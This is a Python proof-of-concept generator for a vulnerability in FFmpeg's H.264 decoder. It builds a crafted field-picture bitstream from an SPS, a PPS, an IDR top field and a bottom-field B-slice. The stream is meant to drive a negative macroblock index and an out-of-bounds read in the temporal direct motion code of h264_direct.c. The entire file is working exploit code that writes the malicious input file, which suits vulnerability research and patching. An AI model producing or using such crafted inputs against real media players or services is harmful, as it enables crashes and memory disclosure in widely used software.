#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  OOB Read via Negative mb_xy in H.264 Field-Picture B-Slice Direct Motion
  Affects: pred_spatial_direct_motion() / pred_temp_direct_motion()
  File: libavcodec/h264_direct.c lines 302-305 / 521-524

Trigger path:
  1. SPS with frame_mbs_only_flag=0, mb_adaptive_frame_field_flag=0 (PAFF)
  2. IDR TOP FIELD (field_pic_flag=1, bottom_field_flag=0) → stored as reference
  3. BOTTOM FIELD B-slice (field_pic_flag=1, bottom_field_flag=1)
     - First MB = B_Direct_16x16 (mb_type=0)
     - IS_INTERLACED(*mb_type) is set because MB_FIELD(sl)=1 for field picture
     - sl->ref_list[1][0] = IDR TOP FIELD → parent->field_picture=1
     - col_fieldoff = 2*PICT_TOP_FIELD - 3 = -1  (set in ff_h264_direct_ref_list_init)
     - mb_y += col_fieldoff → mb_y = 0 + (-1) = -1
     - mb_xy += mb_stride * col_fieldoff → mb_xy = 0 - mb_stride = NEGATIVE
     - Access parent->mb_type[mb_xy] with mb_xy<0 → OOB READ
"""
import sys

# ---------------------------------------------------------------------------
# Bit-level helpers
# ---------------------------------------------------------------------------

def ue(val):
    """Unsigned Exp-Golomb code, returns list of bits."""
    if val == 0:
        return [1]
    n = val + 1
    k = n.bit_length()
    prefix = [0] * (k - 1) + [1]
    suffix = [(n >> (k - 1 - i)) & 1 for i in range(1, k)]
    return prefix + suffix

def se(val):
    """Signed Exp-Golomb code, returns list of bits."""
    if val > 0:
        return ue(2 * val - 1)
    else:
        return ue(-2 * val)

def u(val, n):
    """Fixed-length n-bit unsigned integer, returns list of bits."""
    return [(val >> (n - 1 - i)) & 1 for i in range(n)]

def bits_to_bytes(bits):
    """Convert bit list to bytes (must be multiple of 8)."""
    assert len(bits) % 8 == 0, f"bits length {len(bits)} not multiple of 8"
    out = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        out.append(b)
    return bytes(out)

def pad_to_byte(bits):
    """Pad bit list with zeros to next byte boundary."""
    bits = list(bits)
    while len(bits) % 8 != 0:
        bits.append(0)
    return bits

def add_rbsp_trailing(bits):
    """Add RBSP trailing bits: stop bit=1 followed by zero bits to byte boundary."""
    bits = list(bits)
    bits.append(1)  # stop bit
    while len(bits) % 8 != 0:
        bits.append(0)
    return bits

def emulation_prevention(data):
    """Insert 0x03 emulation prevention bytes to avoid forbidden start-code patterns."""
    out = bytearray()
    zeros = 0
    for byte in data:
        if zeros == 2 and byte <= 0x03:
            out.append(0x03)
            zeros = 0
        out.append(byte)
        zeros = (zeros + 1) if byte == 0x00 else 0
    return bytes(out)

def make_nalu(nal_ref_idc, nal_unit_type, rbsp):
    """Wrap RBSP in a NAL unit with 4-byte Annex B start code."""
    header = (nal_ref_idc << 5) | nal_unit_type
    raw = bytes([header]) + rbsp
    protected = emulation_prevention(raw)
    return b'\x00\x00\x00\x01' + protected


# ---------------------------------------------------------------------------
# SPS (NALU type 7)
# ---------------------------------------------------------------------------
# Key parameters:
#   profile_idc=77 (Main profile, supports field pictures)
#   frame_mbs_only_flag=0   -> enables PAFF field pictures (CRITICAL)
#   mb_adaptive_frame_field_flag=0  -> PAFF, not MBAFF (CRITICAL)
#   pic_width_in_mbs_minus1=0  -> 16 pixels wide (1 MB)
#   pic_height_in_map_units_minus1=0  -> 1 map unit
#     With frame_mbs_only=0: FrameHeightInMbs=2, each field has 1 MB
#   pic_order_cnt_type=0, log2_max_pic_order_cnt_lsb_minus4=4 -> 8-bit lsb
#   log2_max_frame_num_minus4=0 -> 4-bit frame_num
#   max_num_ref_frames=1
def make_sps():
    b = []
    b += u(77, 8)     # profile_idc = 77 (Main)
    b += u(0x40, 8)   # constraint_set1_flag=1 (Main profile marker), others=0
    b += u(30, 8)     # level_idc = 30 (Level 3.0)
    b += ue(0)        # seq_parameter_set_id = 0
    b += ue(0)        # log2_max_frame_num_minus4 = 0  (frame_num uses 4 bits)
    b += ue(0)        # pic_order_cnt_type = 0
    b += ue(4)        # log2_max_pic_order_cnt_lsb_minus4 = 4  (lsb uses 8 bits)
    b += ue(1)        # max_num_ref_frames = 1
    b += [0]          # gaps_in_frame_num_value_allowed_flag = 0
    b += ue(0)        # pic_width_in_mbs_minus1 = 0  (width = 16 px, 1 MB)
    b += ue(0)        # pic_height_in_map_units_minus1 = 0  (1 map unit)
    b += [0]          # frame_mbs_only_flag = 0  *** CRITICAL: enables field pictures ***
    b += [0]          # mb_adaptive_frame_field_flag = 0  *** PAFF, not MBAFF ***
    b += [1]          # direct_8x8_inference_flag = 1
    b += [0]          # frame_cropping_flag = 0
    b += [0]          # vui_parameters_present_flag = 0
    rbsp = bits_to_bytes(add_rbsp_trailing(b))
    return make_nalu(3, 7, rbsp)


# ---------------------------------------------------------------------------
# PPS (NALU type 8)
# ---------------------------------------------------------------------------
# CAVLC (entropy_coding_mode_flag=0) for simpler MB syntax
def make_pps():
    b = []
    b += ue(0)        # pic_parameter_set_id = 0
    b += ue(0)        # seq_parameter_set_id = 0
    b += [0]          # entropy_coding_mode_flag = 0  (CAVLC)
    b += [0]          # bottom_field_pic_order_in_frame_present_flag = 0
    b += ue(0)        # num_slice_groups_minus1 = 0
    b += ue(0)        # num_ref_idx_l0_default_active_minus1 = 0
    b += ue(0)        # num_ref_idx_l1_default_active_minus1 = 0
    b += [0]          # weighted_pred_flag = 0
    b += u(0, 2)      # weighted_bipred_idc = 0
    b += se(0)        # pic_init_qp_minus26 = 0
    b += se(0)        # pic_init_qs_minus26 = 0
    b += se(0)        # chroma_qp_index_offset = 0
    b += [1]          # deblocking_filter_control_present_flag = 1
    b += [0]          # constrained_intra_pred_flag = 0
    b += [0]          # redundant_pic_cnt_present_flag = 0
    rbsp = bits_to_bytes(add_rbsp_trailing(b))
    return make_nalu(3, 8, rbsp)


# ---------------------------------------------------------------------------
# IDR TOP FIELD (NALU type 5, nal_ref_idc=3)
# ---------------------------------------------------------------------------
# slice header: I-slice, field_pic_flag=1, bottom_field_flag=0
# MB data: I_PCM (mb_type=25 in I-slice) - avoids all residual coding complexity
#
# I_PCM syntax in CAVLC (h264_cavlc.c line 759):
#   mb_type = ue(25) -> IS_INTRA_PCM
#   byte alignment (pcm_alignment_zero_bits)
#   256 bytes luma PCM
#   64 bytes Cb PCM
#   64 bytes Cr PCM
#   (no RBSP trailing yet - handled after PCM)
def make_idr_top_field():
    # --- Slice header bits ---
    hbits = []
    hbits += ue(0)       # first_mb_in_slice = 0
    hbits += ue(7)       # slice_type = 7 (I-all: slice_type%5=2 = I)
    hbits += ue(0)       # pic_parameter_set_id = 0
    # frame_mbs_only_flag=0, so field_pic_flag is present
    hbits += u(0, 4)     # frame_num = 0  (4-bit field from log2_max_frame_num=4)
    hbits += [1]         # field_pic_flag = 1  (field picture)
    hbits += [0]         # bottom_field_flag = 0  (TOP FIELD)
    # nal_unit_type=5 (IDR): idr_pic_id present
    hbits += ue(0)       # idr_pic_id = 0
    # pic_order_cnt_type=0: pic_order_cnt_lsb present (8 bits)
    hbits += u(0, 8)     # pic_order_cnt_lsb = 0  (TOP FIELD POC = 0)
    # redundant_pic_cnt_present_flag=0: redundant_pic_cnt absent
    # slice_type is I, not B: direct_spatial_mv_pred_flag absent
    # slice_type is I, not P/B: num_ref_idx_active_override_flag absent
    # ref_pic_list_modification(): for I-slice (type%5=2), no bits
    # weighted_pred_flag=0 and I-slice: no pred_weight_table
    # nal_ref_idc=3 != 0: dec_ref_pic_marking() present
    #   nal_unit_type=5 (IDR):
    hbits += [0]         # no_output_of_prior_pics_flag = 0
    hbits += [0]         # long_term_reference_flag = 0
    # CAVLC: no cabac_init_idc
    hbits += se(0)       # slice_qp_delta = 0
    # deblocking_filter_control_present_flag=1:
    hbits += ue(1)       # disable_deblocking_filter_idc = 1  (filter disabled)
    # (disable_deblocking_filter_idc==1 -> no alpha/beta offsets)

    # --- MB data: mb_type = I_PCM = ue(25) ---
    hbits += ue(25)      # mb_type = 25 = I_PCM

    # Pad to byte boundary for PCM alignment
    hbits = pad_to_byte(hbits)
    hdr_bytes = bits_to_bytes(hbits)

    # PCM sample data: 256 luma + 64 Cb + 64 Cr = 384 bytes (all zero = gray)
    # ff_h264_mb_sizes[1 (4:2:0)] = 384, bit_depth_luma=8 -> skip 384*8=3072 bits
    pcm_data = bytes(384)

    # After PCM data we are byte-aligned; RBSP trailing = 0x80
    rbsp = hdr_bytes + pcm_data + b'\x80'
    return make_nalu(3, 5, rbsp)


# ---------------------------------------------------------------------------
# BOTTOM FIELD B-slice (NALU type 1, nal_ref_idc=0)
# ---------------------------------------------------------------------------
# This is the trigger slice.
# field_pic_flag=1, bottom_field_flag=1 -> BOTTOM FIELD
# slice_type=6 (B-all), direct_spatial_mv_pred_flag=0 (temporal direct)
# frame_num=1 (different frame from IDR)
# L1[0] = IDR TOP FIELD (the only picture in DPB)
#
# In ff_h264_direct_ref_list_init():
#   h->picture_structure = PICT_BOTTOM_FIELD = 2
#   sl->ref_list[1][0].reference = PICT_TOP_FIELD = 1
#   !(2 & 1) = true AND !parent->mbaff = true (PAFF)
#   -> col_fieldoff = 2*1 - 3 = -1
#
# In pred_temp_direct_motion() when first MB (mb_xy=0, mb_y=0) is B_Direct_16x16:
#   IS_INTERLACED(*mb_type) is TRUE (MB_FIELD(sl)=1 for field pictures sets
#   MB_TYPE_INTERLACED in ff_h264_decode_mb_cavlc line 754-755)
#   parent->field_picture=1 -> outer if taken, inner else (vulnerable) taken:
#     mb_y  += col_fieldoff  -> mb_y  = 0 - 1 = -1
#     mb_xy += mb_stride * col_fieldoff  -> mb_xy = 0 - 2 = -2
#   goto single_col:
#     mb_type_col[0] = parent->mb_type[mb_xy]  <- OOB READ with mb_xy=-2
#
# CAVLC B-slice MB reading (h264_cavlc.c):
#   1. mb_skip_run = ue(0) -> skip=0, so not skipped
#   2. mb_type = ue(0) -> ff_h264_b_mb_type_info[0] = B_Direct_16x16
#      (MB_TYPE_DIRECT2|MB_TYPE_L0L1, partition_count=1)
#   3. MB_FIELD(sl)=1 -> mb_type |= MB_TYPE_INTERLACED
#   4. IS_DIRECT(mb_type) -> ff_h264_pred_direct_motion() called -> CRASH
def make_bottom_field_bslice():
    b = []
    b += ue(0)        # first_mb_in_slice = 0
    b += ue(6)        # slice_type = 6 (B-all: slice_type%5=1=B)
    b += ue(0)        # pic_parameter_set_id = 0
    # frame_mbs_only_flag=0, so field_pic_flag present
    b += u(1, 4)      # frame_num = 1  (different from IDR's frame_num=0)
    b += [1]          # field_pic_flag = 1  (field picture)
    b += [1]          # bottom_field_flag = 1  *** BOTTOM FIELD - CRITICAL ***
    # not IDR: no idr_pic_id
    # pic_order_cnt_type=0:
    b += u(2, 8)      # pic_order_cnt_lsb = 2  (POC=2 for BOTTOM FIELD)
    # slice_type is B:
    b += [0]          # direct_spatial_mv_pred_flag = 0  (temporal direct mode)
    # slice_type is B:
    b += [0]          # num_ref_idx_active_override_flag = 0
    # ref_pic_list_modification() for B-slice (type%5=1):
    #   both l0 and l1 flags present
    b += [0]          # ref_pic_list_modification_flag_l0 = 0
    b += [0]          # ref_pic_list_modification_flag_l1 = 0
    # weighted_pred_flag=0, not P/SP: no pred_weight_table
    # nal_ref_idc=0: dec_ref_pic_marking() ABSENT
    # CAVLC: no cabac_init_idc
    b += se(0)        # slice_qp_delta = 0
    # deblocking_filter_control_present_flag=1:
    b += ue(1)        # disable_deblocking_filter_idc = 1  (disabled, no offsets)

    # --- MB data (CAVLC B-slice) ---
    # B-slice: mb_skip_run must be read before mb_type
    b += ue(0)        # mb_skip_run = 0  (first MB is not skipped)
    # mb_type for B_Direct_16x16:
    b += ue(0)        # mb_type = 0 -> B_Direct_16x16 via ff_h264_b_mb_type_info[0]
    # After IS_DIRECT detected, ff_h264_pred_direct_motion() is called immediately
    # -> crash occurs before any coded_block_pattern is read

    rbsp = bits_to_bytes(add_rbsp_trailing(b))
    return make_nalu(0, 1, rbsp)


# ---------------------------------------------------------------------------
# Main: assemble and write the H.264 Annex B bitstream
# ---------------------------------------------------------------------------
def main():
    output = b''
    output += make_sps()
    output += make_pps()
    output += make_idr_top_field()
    output += make_bottom_field_bslice()

    fname = 'vuln_001_input.h264'
    with open(fname, 'wb') as f:
        f.write(output)

    print(f"[+] Generated {fname} ({len(output)} bytes)")
    print(f"    SPS:  frame_mbs_only_flag=0, mb_adaptive_frame_field_flag=0 (PAFF)")
    print(f"    IDR:  TOP FIELD, I_PCM MB")
    print(f"    Bslice: BOTTOM FIELD, B_Direct_16x16 MB")
    print(f"    Expected: OOB read in pred_temp_direct_motion() at h264_direct.c:553")

if __name__ == '__main__':
    main()
